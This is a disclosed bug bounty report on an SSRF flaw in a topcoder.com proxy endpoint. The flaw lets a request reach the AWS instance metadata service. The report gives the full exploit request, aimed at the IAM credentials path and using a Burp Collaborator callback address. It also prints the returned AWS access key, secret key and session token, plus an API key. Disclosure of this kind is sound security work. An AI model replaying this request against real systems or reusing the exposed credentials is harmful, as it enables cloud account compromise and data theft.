# SSRF to AWS file read

## Report Details
- **Report ID**: 978823
- **URL**: https://hackerone.com/reports/978823
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-09-11T01:32:47.653Z
- **Disclosed**: 2021-09-16T22:30:13.060Z

## Reporter
- **Username**: zhh
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: lab45

## Vulnerability Information
## Summary:
after seeing the disclosure it looks like the bug was not fixed properly

## Steps To Reproduce:
copy and paste the request below and paste it into Burpsuite repeater

`GET /community-app-assets/api/proxy-post?url=http%3A%2F%2F169.254.169.254%2F/latest/meta-data/iam/security-credentials/ecsInstanceRole%3Fu%3D65bd5a1857b73643aad556093%26amp%3Bid%3D934e9ffdc5 HTTP/1.1
Host: cognitive.topcoder.com
Content-Length: 108
Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://cognitive.topcoder.com
Referer: http://cognitive.topcoder.com/ibm-cloud
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9`

`b_65bd5a1857b73643aad556093_934e9ffdc5=&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net`



##Response
`HTTP/1.1 200 OK
Date: Fri, 11 Sep 2020 01:28:12 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Set-Cookie: AWSALB=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/
Set-Cookie: AWSALBCORS=aSpYpAdScSiCogY5VQi4XHhFWnu3JHIrxMXl5tMUe/tkJvgoS7oE/ss8jqxWakYo2YgARf7QZsQGKzAP40hOG0W3WA/IugU/FFGaQkZ2LXjrPk2hoP8fxJiVxycf; Expires=Fri, 18 Sep 2020 01:28:12 GMT; Path=/; SameSite=None
X-DNS-Prefetch-Control: off
X-Frame-Options: SAMEORIGIN
Strict-Transport-Security: max-age=15552000; includeSubDomains
X-Download-Options: noopen
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
ETag: W/"512-LkSYc5PU5Y4xWGPxqoM8orPaKK0"
Vary: Accept-Encoding
Content-Length: 1298`

`{
  "Code" : "Success",
  "LastUpdated" : "2020-09-11T00:36:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAV6SVWBIPVJNDI4LO",
  "SecretAccessKey" : "wAwYDQcsfEMUyku//RxXI/NjdAMUtRLj4cfSiEVQ",
  "Token" : "IQoJb3JpZ2luX2VjEGEaCXVzLWVhc3QtMSJIMEYCIQD8srpZ/87c2HrLYddytORezee2NMx0/PWk4UH+2nahPgIhAOwlCmFgVAcdsUBpbDHI6McTLQcHlUnA/FAMOf5GoMWmKrQDCGoQABoMNDA5Mjc1MzM3MjQ3Igw+zvAcQIYJijsNTWsqkQMfVMu7kgOepBvF96NdZHk4KxICWOBDlrJN/MR9o3Hf6Ohst+4d/tbGeyCL7xClsepu+02nf/sX7Ggtx9ciqAg14OmsUWjzp4ZHntge0oi9AJpfyc76UVFNFdTwbo/hEEHKfjgC18lFW+E5DIP00Ifm7usFgLLABozP9Av/hJLwCWG7UHfnHicvc0eY9Tscc+RS4U0GWvUGGXji1vm/8ud5c7Ou6h2z2fo9fSODgq/c1sZReVtofuhSYOfpYtr4ByrHMVY78aR+VrF//6870MUJWNOI4EK3NFxtPH6HCJRmBwh3iVTqYI+vawove6BG3PmMkeyBZSqCqFCTuf+H/eEdw6orjNQ7BxurtB8ZaymaUABhNKfQTBeDBy8/G/wK75v7YZjPUmalMf89wGvshp5EHQVYySr3RGlS9Ti5FbIzR0Gl+5cLx/0AX6ce8L5UrXACpOLktOJe+l/W1KQchNOs9MEwSTYi+sa1qITd17XS9tp0BuRlZSX4MGQ0SJvDEmNvQq84avF4SLbqJLNZEVn0uDCkjev6BTrqAb5BqJ09VpgjlBloe0SAGp4uNlWheqWl+Vt3S+jcVRqf4LNAM3hbEvRB6pTt9itSE6l4y40QADcmMs0oWc6sm+oCG5enAkRxQBFYFDt+OvbxnSnQmaG3YDuRRJwpsaMA/V0TLqpQq5wvJMOssylXffenYIFpVIbZ5BQ5elDVqVpol/1fe+ej3slNvG6VqD3/OwLyNPjfAhdG3UmYzqyr3ym6uywn0KmLMY9esM7Mde5KA2LmgozCKpkV18u0LGCORGXGnllCWpuifVMYXoLQJgk8LCB5H6FbBbcqVvE5FGabClXZG3UIbhPsfg==",
  "Expiration" : "2020-09-11T06:47:23Z"
}`


## Supporting Material/References:
video PoC: F983368

## Impact

aws file read

## Attachments
- bandicam_2020-09-11_01-28-03-986.avi
